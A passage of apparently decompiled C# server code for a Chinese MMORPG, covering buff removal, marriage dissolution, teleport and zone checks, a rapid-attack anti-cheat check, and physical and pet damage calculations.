				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000028:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000029:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				break;
			case 1008000141:
				base.FLD_人物_追加_经验百分比 -= 0.3;
				base.FLD_人物_追加_历练百分比 -= 0.3;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				base.FLD_人物_追加_吸魂几率百分比 += 15.0;
				base.FLD_人物_追加_武勋获得量百分比 -= 0.5;
				break;
			case 1008000140:
				base.FLD_人物_追加_经验百分比 -= 0.25;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000124:
				base.FLD_人物_追加_经验百分比 -= 0.25;
				base.FLD_人物_追加_历练百分比 -= 0.5;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				break;
			case 1008000312:
				base.FLD_人物_追加_经验百分比 -= 0.3;
				base.FLD_人物_追加_历练百分比 -= 0.3;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				base.FLD_人物_追加_吸魂几率百分比 += 15.0;
				base.FLD_人物_追加_武勋获得量百分比 -= 0.5;
				base.FLD_人物_追加_物品掉落概率百分比 -= 0.2;
				break;
			case 1008000311:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.2;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				base.FLD_人物_追加_武勋获得量百分比 -= 0.5;
				base.FLD_人物_追加_吸魂几率百分比 += 15.0;
				break;
			case 1008000877:
				base.FLD_人物_追加_经验百分比 -= 0.2;
				base.FLD_人物_追加_历练百分比 -= 0.2;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				base.FLD_人物_追加_武勋获得量百分比 -= 0.5;
				base.FLD_人物_追加_吸魂几率百分比 += 15.0;
				break;
			case 1008000320:
				base.FLD_人物_追加_经验百分比 -= 0.3;
				base.FLD_人物_追加_历练百分比 -= 0.3;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				base.FLD_人物_追加_吸魂几率百分比 += 15.0;
				base.FLD_人物_追加_武勋获得量百分比 -= 0.5;
				base.FLD_人物_追加_物品掉落概率百分比 -= 0.2;
				break;
			case 1008000318:
				base.FLD_人物_追加_经验百分比 -= 0.3;
				base.FLD_人物_追加_历练百分比 -= 0.3;
				base.FLD_人物_追加_获得游戏币百分比 -= 0.2;
				base.FLD_人物_追加_合成成功率百分比 -= 0.05;
				base.FLD_人物_追加_贩卖价格百分比 -= 0.2;
				base.FLD_人物_追加_吸魂几率百分比 += 15.0;
				base.FLD_人物_追加_武勋获得量百分比 -= 0.5;
				base.FLD_人物_追加_物品掉落概率百分比 -= 0.2;
				base.FLD_人物_追加_物品掉落概率百分比 -= 0.2;
				break;
			}
			公有药品.Remove(ID);
			if (base.FLD_人物_追加_经验百分比 < 0.0)
			{
				base.FLD_人物_追加_经验百分比 = 0.0;
			}
			if (base.FLD_人物_追加_历练百分比 < 0.0)
			{
				base.FLD_人物_追加_历练百分比 = 0.0;
			}
			if (base.FLD_人物_追加_获得游戏币百分比 < 0.0)
			{
				base.FLD_人物_追加_获得游戏币百分比 = 0.0;
			}
			if (base.FLD_人物_追加_合成成功率百分比 < 0.0)
			{
				base.FLD_人物_追加_合成成功率百分比 = 0.0;
			}
			if (base.FLD_人物_追加_贩卖价格百分比 < 0.0)
			{
				base.FLD_人物_追加_贩卖价格百分比 = 0.0;
			}
			if (base.FLD_人物_追加_吸魂几率百分比 < 0.0)
			{
				base.FLD_人物_追加_吸魂几率百分比 = 0.0;
			}
			if (base.FLD_人物_追加_武勋获得量百分比 < 0.0)
			{
				base.FLD_人物_追加_武勋获得量百分比 = 0.0;
			}
			if (!(base.FLD_人物_追加_物品掉落概率百分比 >= 0.0))
			{
				base.FLD_人物_追加_物品掉落概率百分比 = 0.0;
			}
		}

		public void 检测婚姻状态()
		{
			try
			{
				if (解除关系倒计时 > 0)
				{
					解除关系倒计时 -= World.挂机奖励时间周期;
					if (解除关系倒计时 <= 0)
					{
						byte[] array = Converter.hexStringToByte("AA558E002C017C1780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000568055AA");
						情侣提示(10, base.UserName, base.FLD_情侣);
						Players players = 得到人物数据(base.FLD_情侣);
						if (players != null)
						{
							players.FLD_是否可以送花 = false;
							players.是否已婚 = 0;
							players.情侣提示(10, players.UserName, players.FLD_情侣);
							players.FLD_情侣 = string.Empty;
							players.FLD_情侣_爱情度 = 0;
							players.武功新[2, 16] = null;
							players.武功新[2, 17] = null;
							players.婚戒刻字 = string.Empty;
							players.解除关系倒计时 = 0;
							players.更新武功和状态();
							players.更新人物数据(players);
							players.更新广播人物数据();
							System.Buffer.BlockCopy(BitConverter.GetBytes(players.人物全服ID), 0, array, 4, 2);
							if (players.Client != null)
							{
								players.Client.Send多包(array, array.Length);
							}
						}
						else
						{
							RxjhClass.解除情侣关系(base.FLD_情侣);
						}
						是否已婚 = 0;
						FLD_是否可以送花 = false;
						解除关系倒计时 = 0;
						婚戒刻字 = string.Empty;
						base.FLD_情侣 = string.Empty;
						base.FLD_情侣_爱情度 = 0;
						武功新[2, 16] = null;
						武功新[2, 17] = null;
						婚戒刻字 = string.Empty;
						更新武功和状态();
						更新人物数据(this);
						更新广播人物数据();
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send多包(array, array.Length);
						}
					}
				}
			}
			catch
			{
			}
		}

		public bool MoveAllto(int far_, 坐标Class 坐标)
		{
			if (坐标.Rxjh_Map != base.人物坐标_地图)
			{
				return false;
			}
			float num = 坐标.Rxjh_X - base.人物坐标_X;
			float num2 = 坐标.Rxjh_Y - base.人物坐标_Y;
			return (double)(int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= (double)far_;
		}

		public void 传送点移动(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[4];
			System.Buffer.BlockCopy(封包数据, 26, array, 0, 4);
			int num = Buffer.ToInt32(array, 0);
			switch (num)
			{
			default:
				foreach (MoveClass item in World.Mover)
				{
					if (item.MAP == base.人物坐标_地图 && item.ToMAP == num)
					{
						float num2 = item.X - base.人物坐标_X;
						float num3 = item.Y - base.人物坐标_Y;
						if (!((double)(int)Math.Sqrt((double)num2 * (double)num2 + (double)num3 * (double)num3) > 200.0))
						{
							if (base.FLD_VIP == 0)
							{
								string vIP地图 = World.VIP地图;
								char[] separator = new char[1]
								{
									';'
								};
								string[] array2 = vIP地图.Split(separator);
								foreach (string b in array2)
								{
									if (坐标Class.getmapname(item.ToMAP) == b)
									{
										系统提示("本地图名是会员地图，非会员不可以进入。");
										return;
									}
								}
							}
							string[] array3 = World.地图锁定.Split(';');
							if (array3.Length >= 1)
							{
								for (int j = 0; j < array3.Length; j++)
								{
									if (int.Parse(array3[j]) == base.人物坐标_地图)
									{
										return;
									}
								}
							}
							移动(item.ToX, item.ToY, item.ToZ, item.ToMAP);
							return;
						}
					}
				}
				Form1.WriteLine(2, "传送点移动      " + base.Userid + "      " + base.UserName + "            " + base.人物坐标_X + "            " + base.人物坐标_Y + "      " + base.人物坐标_地图 + "      " + num);
				break;
			case 2:
				移动(0f, 80f, 15f, base.人物坐标_地图 + 1);
				break;
			case 1:
				移动(0f, -80f, 15f, base.人物坐标_地图 - 1);
				break;
			}
		}

		public void 触发移动坐标()
		{
			foreach (MoveClass item in World.Mover)
			{
				if (item.MAP == base.人物坐标_地图)
				{
					float num = item.X - base.人物坐标_X;
					float num2 = item.Y - base.人物坐标_Y;
					if ((double)(int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) <= 20.0)
					{
						移动(item.ToX, item.ToY, item.ToZ, item.ToMAP);
					}
				}
			}
		}

		public bool 检查玩家是否在对练区内(Players Playe)
		{
			foreach (坐标Class item in World.对练区)
			{
				if (item.Rxjh_Map == Playe.人物坐标_地图)
				{
					float num = item.Rxjh_X - Playe.人物坐标_X;
					float num2 = item.Rxjh_Y - Playe.人物坐标_Y;
					if (!((double)(int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2) > (double)World.场地有效范围))
					{
						return true;
					}
				}
			}
			return false;
		}

		public bool 检查玩家是否在势力战区域内(Players Playe)
		{
			try
			{
				foreach (坐标Class item in World.势力战区域)
				{
					if (item.Rxjh_Map == Playe.人物坐标_地图 && (double)Playe.人物坐标_X < 150.0 && (double)Playe.人物坐标_X > -150.0 && (double)Playe.人物坐标_Y < 150.0 && !((double)Playe.人物坐标_Y <= -150.0))
					{
						return true;
					}
				}
				return false;
			}
			catch
			{
				return false;
			}
		}

		public bool 触发新手安全区(Players Playe)
		{
			if (Playe.人物坐标_地图 == 101 && !(Playe.UserName == base.UserName))
			{
				if ((double)Playe.人物坐标_X > 0.0 && (double)Playe.人物坐标_Y > 1400.0 && (double)Playe.人物坐标_X < 1316.0 && (double)Playe.人物坐标_Y < 2356.0)
				{
					return true;
				}
				if ((double)Playe.人物坐标_X > 0.0 && (double)Playe.人物坐标_Y < 2356.0 && (double)Playe.人物坐标_X < 1316.0)
				{
					return (double)Playe.人物坐标_Y > 1400.0;
				}
				return false;
			}
			return false;
		}

		public bool 检查玩家是否在帮战区内(Players Playe)
		{
			try
			{
				foreach (坐标Class item in World.帮战区)
				{
					if (item.Rxjh_Map == Playe.人物坐标_地图 && (double)Playe.人物坐标_X < 350.0 && (double)Playe.人物坐标_X > -350.0 && (double)Playe.人物坐标_Y < 350.0 && !((double)Playe.人物坐标_Y <= -350.0))
					{
						return true;
					}
				}
				return false;
			}
			catch
			{
				return false;
			}
		}

		public bool 检查怪物距离(NpcClass Npc)
		{
			if (Npc.Rxjh_Map != base.人物坐标_地图)
			{
				return false;
			}
			float num = Npc.Rxjh_X - base.人物坐标_X;
			float num2 = Npc.Rxjh_Y - base.人物坐标_Y;
			float num3 = (int)Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2);
			if (base.Player_Job == 4)
			{
				if ((double)num3 <= 60.0)
				{
					return true;
				}
			}
			else if (base.Player_Job == 5)
			{
				if ((double)num3 <= 60.0)
				{
					return true;
				}
			}
			else if (base.Player_Job == 7)
			{
				if ((double)num3 <= 60.0)
				{
					return true;
				}
			}
			else if ((double)num3 <= 30.0)
			{
				return true;
			}
			return false;
		}

		public void 攻击(byte[] data, int length)
		{
			try
			{
				int num2;
				int num3;
				if (base.人物_HP > 0 && !base.Player死亡)
				{
					if (潜行模式 == 1)
					{
						潜行状态(0);
					}
					if (World.PK开关 != 0)
					{
						系统提示("本线禁止PK", 9, "系统提示");
					}
					else
					{
						封包修改(data, length);
						byte[] array = new byte[4];
						System.Buffer.BlockCopy(data, 4, array, 0, 2);
						int num = BitConverter.ToInt32(array, 0);
						byte[] array2 = new byte[4];
						byte[] array3 = new byte[4];
						System.Buffer.BlockCopy(data, 14, array2, 0, 4);
						System.Buffer.BlockCopy(data, 10, array3, 0, 2);
						num2 = BitConverter.ToInt32(array2, 0);
						num3 = BitConverter.ToInt32(array3, 0);
						byte[] array4 = new byte[4];
						byte[] array5 = new byte[4];
						System.Buffer.BlockCopy(data, 18, array4, 0, 4);
						System.Buffer.BlockCopy(data, 26, array5, 0, 4);
						base.人物坐标_X = BitConverter.ToSingle(array4, 0);
						base.人物坐标_Y = BitConverter.ToSingle(array5, 0);
						if (num != base.人物全服ID && num != base.人物封包ID)
						{
							if (num2 != 0)
							{
								魔法攻击灵兽(num2, num3);
							}
							else
							{
								物理攻击灵兽(num2, num3);
							}
						}
						else
						{
							int num4 = (int)DateTime.Now.Subtract(攻击时间检查).TotalMilliseconds;
							if (自动攻击 != null)
							{
								自动攻击.Enabled = false;
								自动攻击.Close();
								自动攻击.Dispose();
								自动攻击 = null;
							}
							if (自动恢复 != null)
							{
								自动恢复.Enabled = false;
								自动恢复.Close();
								自动恢复.Dispose();
								自动恢复 = null;
							}
							武功连击记数器 = -1;
							if (人物灵兽 == null || 人物灵兽.骑 != 1 || 人物灵兽.宠物以装备[4].Get物品ID == 601100001L || 人物灵兽.宠物以装备[4].Get物品ID == 601100002L || 人物灵兽.宠物以装备[4].Get物品ID == 601100003L || 人物灵兽.宠物以装备[4].Get物品ID == 601100004L || 人物灵兽.宠物以装备[4].Get物品ID == 601100005L || 人物灵兽.宠物以装备[4].Get物品ID == 601100006L || 人物灵兽.宠物以装备[4].Get物品ID == 601100007L || 人物灵兽.宠物以装备[4].Get物品ID == 601100008L)
							{
								if (num2 != 0)
								{
									if (num4 >= 1500)
									{
										if (num4 >= 当前攻击时间间隔)
										{
											连续攻击怪物次数 = 0;
											goto IL_036c;
										}
										if (上次攻击人物ID != num3)
										{
											NpcClass value;
											if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(上次攻击人物ID, out value))
											{
												if (value.Rxjh_HP > 0)
												{
													if (攻击列表.Count > 0)
													{
														if (攻击列表[0].攻击力 < value.Rxjh_HP)
														{
															连续攻击怪物次数++;
														}
													}
													else
													{
														连续攻击怪物次数++;
													}
												}
												else
												{
													连续攻击怪物次数 = 0;
												}
											}
											else
											{
												连续攻击怪物次数 = 0;
											}
											goto IL_036c;
										}
										连续攻击怪物次数 = 0;
									}
								}
								else if (num4 < World.连续攻击有效时间)
								{
									if (攻击列表.Count > 1)
									{
										攻击列表.Clear();
									}
								}
								else
								{
									攻击确认次数 = 0;
									攻击时间检查 = DateTime.Now;
									物理攻击(num2, num3);
								}
							}
						}
					}
				}
				goto end_IL_0000;
				IL_036c:
				if (连续攻击怪物次数 > World.连续快速攻击次数)
				{
					系统提示("检测到你快速攻击！");
					if (World.非法攻击外挂操作 > 0 && base.Client != null)
					{
						OpClient(1);
						base.Client.Dispose();
					}
					连续攻击怪物次数 = 0;
				}
				攻击确认次数 = 0;
				攻击时间检查 = DateTime.Now;
				魔法攻击(num2, num3);
				end_IL_0000:;
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "攻击" + base.人物全服ID + "|" + ToString() + " " + ex.Message);
			}
		}

		public void 停止所有定时器()
		{
			try
			{
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
				}
			}
			catch (Exception)
			{
			}
		}

		public void 魔法攻击灵兽(int 武功ID, int 人物ID)
		{
			NpcClass value;
			if (人物ID < 10000 || !MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(人物ID, out value) || value.IsNpc == 1)
			{
				return;
			}
			int num = 0;
			武功类 value2;
			if (World.TBL_KONGFU.TryGetValue(武功ID, out value2))
			{
				double num2 = (((double)人物灵兽.灵兽基本攻击 - value.FLD_DF * 0.7 + (double)人物灵兽.灵兽基本命中) * 1.5 + (double)value2.FLD_AT * (1.0 + 人物灵兽.FLD_装备_武功攻击力增加百分比 + 人物灵兽.FLD_灵兽_武功攻击力增加百分比)) * 1.3 + (double)(base.FLD_人物基本_命中 / 4);
				double num3 = new Random().Next((int)num2 - 15, (int)num2 + 15);
				if (num3 <= 0.0)
				{
					num3 = 1.0;
				}
				发送灵兽攻击人物数据(this, 人物ID, 武功ID, (int)num3, num, value.Max_Rxjh_HP);
				人物灵兽.攻击列表.Clear();
				using (new Lock(人物灵兽.攻击列表, "攻击列表"))
				{
					人物灵兽.攻击列表.Add(new 攻击类(人物ID, 武功ID, (int)num3, num));
				}
			}
		}

		public void 物理攻击灵兽(int 武功ID, int 人物ID)
		{
			NpcClass value;
			if (人物ID >= 10000 && MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(人物ID, out value) && value.IsNpc != 1)
			{
				double num = ((double)人物灵兽.灵兽基本攻击 - value.FLD_DF * 0.7) * 1.5 + (double)(人物灵兽.灵兽基本命中 / 4);
				int num2 = 201;
				double num3 = new Random().Next((int)num - 15, (int)num + 15);
				if (num3 <= 0.0)
				{
					num3 = 1.0;
				}
				发送灵兽攻击人物数据(this, 人物ID, 武功ID, (int)num3, num2, value.Max_Rxjh_HP);
				人物灵兽.攻击列表.Clear();
				using (new Lock(人物灵兽.攻击列表, "攻击列表"))
				{
					人物灵兽.攻击列表.Add(new 攻击类(人物ID, 武功ID, (int)num3, num2));
				}
			}
		}

		public bool 攻击怪物检测(NpcClass npcTemp, int 武功ID)
		{
			try
			{
				if (base.人物坐标_地图 != npcTemp.Rxjh_Map || npcTemp.IsNpc == 1 || base.人物_HP <= 0 || base.Player死亡)
				{
					return false;
				}
				if (npcTemp.Rxjh_HP <= 0)
				{
					npcTemp.NPC死亡 = false;
					npcTemp.更新死亡数据();
					return false;
				}
				if ((base.Player_Job == 4 || base.Player_Job == 11) && Buffer.ToInt32(装备栏已穿装备[12].物品数量, 0) == 0 && 装备栏已穿装备[3].Get物品ID != 0L)
				{
					发送激活技能数据(武功ID, 6);
					初始化已装备物品();
					return false;
				}
				float num = npcTemp.Rxjh_X - base.人物坐标_X;
				float num2 = npcTemp.Rxjh_Y - base.人物坐标_Y;
				double num3 = Math.Sqrt((double)num * (double)num + (double)num2 * (double)num2);
				if (base.人物坐标_地图 == 801)
				{
					if (npcTemp.FLD_PID == 15121)
					{
						if (base.Player_Zx == 1)
						{
							return false;
						}
					}
					else if (npcTemp.FLD_PID == 15122 && base.Player_Zx == 2)
					{
						return false;
					}
				}
				if (base.人物坐标_地图 == 42101 && World.攻城战进程 != 3)
				{
					if (npcTemp.FLD_PID == 16430)
					{
						PkID = 0;
						return false;
					}
					if (npcTemp.FLD_PID == 16431)
					{
						PkID = 0;
						return false;
					}
					if (npcTemp.FLD_PID == 16435)
					{
						PkID = 0;
						return false;
					}
				}
				foreach (攻城数据 value2 in World.攻城数据list.Values)
				{
					if (value2.行会名字 == base.帮派名字)
					{
						if (npcTemp.FLD_PID == 16430)
						{
							PkID = 0;
							return false;
						}
						if (npcTemp.FLD_PID == 16431)
						{
							PkID = 0;
							return false;
						}
						if (npcTemp.FLD_PID == 16435)
						{
							PkID = 0;
							return false;
						}
					}
				}
				if (World.天魔神宫大门是否死亡 == 0 && npcTemp.FLD_PID == 16435)
				{
					PkID = 0;
					return false;
				}
				switch (base.Player_Job)
				{
				default:
					if (num3 > World.其他职业打怪距离)
					{
						return false;
					}
					break;
				case 11:
					if (num3 > 70.0 + base.梅_玄武的指点)
					{
						return false;
					}
					break;
				case 5:
					if (num3 > World.医生打怪距离)
					{
						return false;
					}
					break;
				case 4:
					if (num3 > World.弓箭手打怪距离 + base.弓_猎鹰之眼)
					{
						return false;
					}
					break;
				}
				if (武功ID != 0)
				{
					武功类 value;
					if (!World.TBL_KONGFU.TryGetValue(武功ID, out value) || ((value.FLD_PID == 601201 || value.FLD_PID == 601202 || value.FLD_PID == 100301 || value.FLD_PID == 200301 || value.FLD_PID == 300301 || value.FLD_PID == 400301 || value.FLD_PID == 500301 || value.FLD_PID == 800301) && base.FLD_情侣.Length == 0) || base.Player_Job != value.FLD_JOB || (value.FLD_ZX != 0 && 师傅数据.STNAME != "" && base.Player_Zx != value.FLD_ZX) || (base.Player_Job_leve < value.FLD_JOBLEVEL && (师傅数据.STNAME == "" || base.Player_Job_leve < value.FLD_JOBLEVEL - 1)))
					{
						return false;
					}
					if (base.Player_Level < value.FLD_LEVEL && 师傅数据.STNAME == "")
					{
						return false;
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "攻击怪物检测      错误" + base.人物全服ID + "|" + base.Client.ToString() + "      |      " + 武功ID + "      |      " + npcTemp.FLD_PID + "      |      " + ex.Message);
				return false;
			}
			return true;
		}

		public void 物理攻击(int 武功ID, int 人物ID)
		{
			int num = 0;
			try
			{
				NpcClass value;
				double num2;
				double num7;
				double num9;
				int 攻击类型;
				int num33;
				Players value8;
				if (人物ID != base.人物全服ID)
				{
					if (base.Player_Job == 7)
					{
						base.琴师_三和弦_发动概率 = 0.0;
					}
					num = 1;
					if (人物ID >= 10000)
					{
						if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(人物ID, out value))
						{
							if (!攻击怪物检测(value, 0))
							{
								if (自动攻击 != null)
								{
									自动攻击.Enabled = false;
									自动攻击.Close();
									自动攻击.Dispose();
									自动攻击 = null;
								}
							}
							else
							{
								num = 6;
								num2 = value.FLD_DF;
								double num3 = base.FLD_人物基本_攻击;
								if (base.FLD_装备_追加_降低百分比防御 > 0.0)
								{
									num2 *= 1.0 - base.FLD_装备_追加_降低百分比防御;
								}
								if (中级附魂_复仇 != 0 && (double)RNG.Next(1, 80) <= (double)中级附魂_复仇)
								{
									num2 *= 0.8;
									显示大字(base.人物全服ID, 401);
								}
								num = 7;
								if (base.Player_Job == 1)
								{
									if ((double)RNG.Next(1, 110) <= base.破甲几率)
									{
										num2 *= 得到气功加成值(1, 5, 1);
										显示大字(base.人物全服ID, 16);
									}
								}
								else if (base.Player_Job == 2)
								{
									double num4 = RNG.Next(1, 100);
									double num5 = RNG.Next(1, 100);
									double num6 = 0.0;
									if (num5 <= base.剑_乘胜追击)
									{
										num4 -= base.剑_乘胜追击;
										num6 += base.剑_乘胜追击 * 0.01;
									}
									if (num4 <= base.剑_无坚不摧)
									{
										num2 *= 得到气功加成值(2, 9, 1) - num6;
										显示大字(base.人物全服ID, 120);
									}
								}
								else if (base.Player_Job == 8 && (double)RNG.Next(1, 110) <= base.破甲几率)
								{
									num2 *= 得到气功加成值(8, 7, 1);
									显示大字(base.人物全服ID, 16);
								}
								num7 = num3;
								int num8 = base.FLD_人物基本_命中;
								if (base.Player_Job == 6)
								{
									if (刺_连消带打数量 != 0.0)
									{
										num7 += 刺_连消带打数量 * 0.5;
										刺_连消带打数量 = 0.0;
									}
									if (追加状态列表 != null && GetAddState(801201))
									{
										num8 = (int)((double)num8 * (1.0 + base.刺_先发制人));
									}
								}
								num9 = num7 - num2 + (double)num8 * 0.25;
								num = 11;
								switch (RNG.Next(0, 1))
								{
								default:
									攻击类型 = 126;
									break;
								case 1:
									攻击类型 = 127;
									break;
								case 0:
									攻击类型 = 126;
									break;
								}
								if (Buffer.ToInt32(装备栏已穿装备[3].物品ID, 0) == 0)
								{
									Random random = new Random();
									int 攻击类型2;
									switch (RNG.Next(0, 1))
									{
									default:
										攻击类型2 = 112;
										break;
									case 1:
										攻击类型2 = 113;
										break;
									case 0:
										攻击类型2 = 112;
										break;
									}
									double num10 = random.Next((int)num9 - 15, (int)num9 + 15);
									if (num10 <= 1.0)
									{
										num10 = RNG.Next(1, 5);
									}
									攻击计算完成(this, 人物ID, 武功ID, (int)num10, 攻击类型2, value.Rxjh_HP, 0);
								}
								else if (num9 <= 0.0)
								{
									double num11 = (base.FLD_装备_追加_伤害值 < 0) ? 0.0 : ((double)base.FLD_装备_追加_伤害值);
									if (num11 <= 1.0)
									{
										num11 = RNG.Next(1, 5);
									}
									攻击计算完成(this, 人物ID, 武功ID, (int)num11, 攻击类型, value.Rxjh_HP, 0);
								}
								else
								{
									RNG.Next(0, 8);
									if (base.Player_Job == 1)
									{
										if ((double)RNG.Next(1, 100) < base.暗影绝杀)
										{
											显示大字(base.人物全服ID, 18);
											num9 *= 得到气功加成值(1, 9, 1);
										}
										goto IL_0e3e;
									}
									if (base.Player_Job == 2)
									{
										if ((double)RNG.Next(1, 110) < base.剑_怒海狂澜)
										{
											num9 *= 得到气功加成值(2, 7, 1);
										}
										if (base.剑_破天一剑 != 0.0)
										{
											num9 *= 1.0 + base.剑_破天一剑;
										}
										goto IL_0e3e;
									}
									if (base.Player_Job == 4)
									{
										int num12 = RNG.Next(1, 130);
										int num13 = RNG.Next(1, 130);
										int num14 = RNG.Next(1, 120);
										int num15 = RNG.Next(1, 130);
										if ((double)num13 <= base.弓_心神凝聚)
										{
											攻击类型 = 136;
											double num16 = 得到气功加成值(4, 7, 1);
											num9 = ((num7 - num2) * 1.5 + (double)base.FLD_人物基本_命中 * 0.25) * num16;
										}
										else if ((double)num14 <= base.弓_流星三矢 + base.弓_升天一气功_绝影射魂)
										{
											显示大字(base.人物全服ID, 47);
											num9 = ((num7 - num2) * 1.5 + (double)base.FLD_人物基本_命中 * 0.25) * 2.0;
											攻击类型 = 129;
										}
										else
										{
											switch (RNG.Next(0, 6))
											{
											default:
												攻击类型 = 126;
												break;
											case 1:
												攻击类型 = 126;
												break;
											case 2:
												攻击类型 = 126;
												break;
											case 3:
												攻击类型 = 127;
												break;
											case 4:
												攻击类型 = 128;
												num9 = ((num7 - num2) * 1.5 + (double)base.FLD_人物基本_命中 * 0.25) * 2.0;
												break;
											case 5:
												攻击类型 = 134;
												num9 = ((num7 - num2) * 1.5 + (double)base.FLD_人物基本_命中 * 0.25) * 2.5;
												break;
											}
										}
										if ((double)num15 <= base.弓_致命绝杀)
										{
											double num17 = base.弓_致命绝杀 * 得到气功加成值(4, 11, 1);
											num9 *= 1.0 + num17;
											显示大字(base.人物全服ID, 140);
										}
										num9 += base.弓_锐利之箭 + 1.0;
										if ((double)num12 <= base.弓_无明暗矢)
										{
											num9 *= 1.05 + base.弓_无明暗矢 * 0.005;
											显示大字(base.人物全服ID, 49);
										}
										if ((double)RNG.Next(1, 100) <= base.升天五式_千里一击)
										{
											num9 *= 1.0 + base.升天五式_千里一击 * 2.0 / 100.0;
											显示大字(base.人物全服ID, 1017);
										}
										goto IL_0e3e;
									}
									if (base.Player_Job != 6)
									{
										if (base.Player_Job == 7)
										{
											if (追加状态列表 != null)
											{
												if (!GetAddState(900401))
												{
													int num18 = RNG.Next(0, 100);
													if ((double)RNG.Next(1, 110) <= base.琴师_梅花三弄 * 100.0)
													{
														显示大字(base.人物全服ID, 87);
														int num19 = (num18 <= 33) ? 900401 : ((num18 < 33 || num18 > 66) ? 900403 : 900402);
														if (!GetAddState(900402) && !GetAddState(900403))
														{
															追加状态类 value2 = new 追加状态类(this, 60000, num19, 0);
															追加状态列表.Add(num19, value2);
															状态效果(Buffer.GetBytes(num19), 1, 60000);
															更新人物数据(this);
														}
													}
													num = 17;
												}
												else
												{
													int num20 = RNG.Next(1, 10);
													double num21 = RNG.Next(1, 100);
													int num22 = RNG.Next(1, 100);
													int num23 = RNG.Next(1, 100);
													int num24 = RNG.Next(1, 100);
													base.琴师_三和弦_发动概率 = 5.0 + base.琴师_岳阳三醉 * 0.005 * 100.0;
													if (num21 <= base.琴师_鸾凤和鸣 + base.琴师_升天一气功_飞花点翠 * 0.2)
													{
														显示大字(base.人物全服ID, 88);
														base.琴师_三和弦_发动概率 *= 2.0;
													}
													num = 18;
													if ((double)num22 <= base.琴师_三和弦_发动概率)
													{
														if ((double)num23 <= base.琴师_阳明春晓 * 0.5 && !value.ContainsKeyInAbnormalState(1))
														{
															int 时间 = (int)base.琴师_阳明春晓 * 2000;
															异常状态类 value3 = new 异常状态类(value, base.人物全服ID, 时间, 1, 0.0);
															value.异常状态.Add(1, value3);
														}
														num = 19;
														if ((double)num24 <= base.琴师_潇湘雨夜 * 0.5 && !value.ContainsKeyInAbnormalState(2))
														{
															int 时间2 = (int)base.琴师_潇湘雨夜 * 2000;
															异常状态类 value4 = new 异常状态类(value, base.人物全服ID, 时间2, 2, 0.0);
															value.异常状态.Add(2, value4);
														}
														num = 20;
														if (num20 == 10 && !value.ContainsKeyInAbnormalState(10))
														{
															异常状态类 异常状态类 = new 异常状态类(value, base.人物全服ID, 10000, 10, (int)num9);
															异常状态类.异常状态类出血(num9);
															value.异常状态.Add(10, 异常状态类);
														}
														num = 21;
														if (!value.ContainsKeyInAbnormalState(9) && !value.ContainsKeyInAbnormalState(11))
														{
															if (num22 <= 50)
															{
																double num25 = 10000.0 + base.琴师_阳明春晓 * 1000.0;
																异常状态类 value5 = new 异常状态类(value, base.人物全服ID, (int)num25, 11, 0.0);
																value.异常状态.Add(11, value5);
															}
															else
															{
																double num26 = 10000.0 + base.琴师_潇湘雨夜 * 1000.0;
																异常状态类 value6 = new 异常状态类(value, base.人物全服ID, (int)num26, 9, 0.0);
																value.异常状态.Add(9, value6);
															}
														}
														num = 22;
													}
												}
											}
										}
										else if (base.Player_Job == 9)
										{
											if ((double)RNG.Next(1, 100) < base.谭_怒海狂澜)
											{
